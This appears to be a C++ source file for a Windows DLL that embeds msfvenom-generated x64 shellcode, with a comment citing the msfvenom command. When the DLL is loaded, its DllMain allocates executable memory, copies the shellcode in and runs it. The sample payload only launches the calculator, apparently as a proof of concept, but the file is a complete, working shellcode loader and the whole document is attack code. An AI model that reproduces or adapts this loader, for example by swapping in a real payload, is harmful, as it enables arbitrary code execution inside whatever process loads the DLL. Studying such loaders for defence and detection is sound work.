#include "stdafx.h"
#include <stdio.h>

//http://mcdermottcybersecurity.com/articles/windows-x64-shellcode
// ./msfvenom --payload  windows/x64/exec CMD="calc" EXITFUNC=none -f c

const char buf[] =
//"\xcc"
"\x50\x53\x51\x52\x55\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
"\xE9\x05\x00\x00\x00"
"\x63\x61\x6c\x63\x00"
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x4d\xf1\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5"
"\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
"\x48\x83\xC4\x38"
"\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5E\x5F\x5D\x5A\x59\x5B\x58"
"\xFF\x24\x24"
;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		LPVOID lpvBase;

		HANDLE hProcess;
		SIZE_T lpBytesWritten;
		
		hProcess = GetCurrentProcess();
		lpvBase = VirtualAllocEx(
			hProcess,
			NULL,							// System selects address
			sizeof(buf),					// Size of allocation
			MEM_COMMIT,						// Allocate reserved pages
			PAGE_EXECUTE_READWRITE);        // Protection = RWX
		if (lpvBase == NULL)
		{
			wprintf(TEXT("Memory allocation failed."));
			return -1;
		}

		ZeroMemory(lpvBase, sizeof(buf));
		WriteProcessMemory(hProcess, lpvBase, buf, sizeof(buf), &lpBytesWritten);
		wprintf(TEXT("Memory allocation complete."));

		try {
			((void(*)())lpvBase)();
		}
		catch (...)
		{
			return 1;
		}

		ZeroMemory(lpvBase, sizeof(buf));

		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

